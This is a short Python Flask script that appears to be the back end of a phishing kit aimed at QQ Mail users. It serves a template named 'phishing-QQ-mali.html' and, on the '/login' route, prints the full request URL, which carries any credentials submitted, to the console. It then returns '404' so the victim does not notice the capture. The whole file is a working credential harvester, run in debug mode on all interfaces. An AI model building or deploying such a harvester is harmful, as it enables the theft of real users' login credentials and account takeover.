from flask import Flask, render_template,request

app = Flask(__name__)

@app.route('/QQmalilogin')
def index():
    
    return render_template('phishing-QQ-mali.html')
    
@app.route('/login',methods=['GET'])
def login():
    print('[*]',request.url)
    return '404'

def main():
    app.run(host="0.0.0.0",debug=True,port=8080)


main()

